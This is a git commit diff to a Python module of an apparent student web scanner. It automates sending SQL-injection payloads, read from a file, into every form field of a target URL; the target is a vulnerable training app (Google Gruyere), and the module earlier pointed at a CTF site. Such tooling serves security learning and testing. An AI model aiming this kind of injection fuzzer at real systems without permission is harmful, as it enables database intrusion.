4fc818084ee4d515afbade428a567fb9b4d2bbef
bmatissek <bruno.matissek@gmail.com>
2017-07-19 14:35:56 -0300

    Automacao do envio de payloads maliciosos nas requisicoes

--- modules/sql/module_sql.py
+++ modules/sql/module_sql.py
@@ -8,7 +8,7 @@ def BEGIN():
 	return res
 
 def RUN(file_name):
-    url = 'https://ctf.imesec.org/web-4444'
+    url = 'https://google-gruyere.appspot.com/471777688316025202488489537424605038600/login'
     try:
         r = requests.get(url)
         targetParser = HTMLTargetParser()
@@ -18,18 +18,50 @@ def RUN(file_name):
         exit()
 
     if not targetParser.formList:
-        print ("[-] The given URL had no forms for POST targeting")
-    else:
-        for form in targetParser.formList:
-            print (targetParser.formList[0].formType)
-            dataValues={}
-            for dataField in form.elementList:
-                dataValues.update({dataField[1]:'cebola'})
-                print (dataValues)
-            try:
+        print ("[-] The given URL had no forms for targetting")
+        exit()
+
+    defaultValue='cebola'
+    payloadFileName='sql_inj_payload'
+    payloadFile = open(payloadFileName,'r')
+
+    for form in targetParser.formList:
+        print (targetParser.formList[0].formType)
+        #for payload in open(payloadFileName):
+        dataValues={}
+        for dataField in form.elementList:
+            dataValues.update({dataField[1]:defaultValue})
+            print (dataValues)
+        try:
+            if (form.formType == 'POST'):
                 s = requests.post(url,data = dataValues,verify = True)  
                 print (s.text)
+            if (form.formType == 'GET'):
+                s = requests.get(url, params=dataValues, verify = True)
+            f = open('attempts/nonMaliciousAttempt','w')
+            f.write(s.text)
+            f.close()
+        except Exception:
+            print ("[-] An error occured while trying to send data")
+
+    attempt=1
+    for form in targetParser.formList:
+        for payload in payloadFile: 
+            dataValues={}
+            for dataField in form.elementList:
+                dataValues.update({dataField[1]:payload})
+                print (dataValues)
+            try:
+                if (form.formType == 'POST'):
+                    s = requests.post(url,data = dataValues,verify = True)  
+                    print (s.text)
+                if (form.formType == 'GET'):
+                    s = requests.get(url, params=dataValues, verify = True)
+                f = open('attempts/'+str(attempt),'w')
+                f.write(s.text)
+                f.close()
+                attempt+=1
             except Exception:
-                print ("[-] An error occured while trying to POST data")
+                print ("[-] An error occured while trying to send data")
 
 RUN("mope")
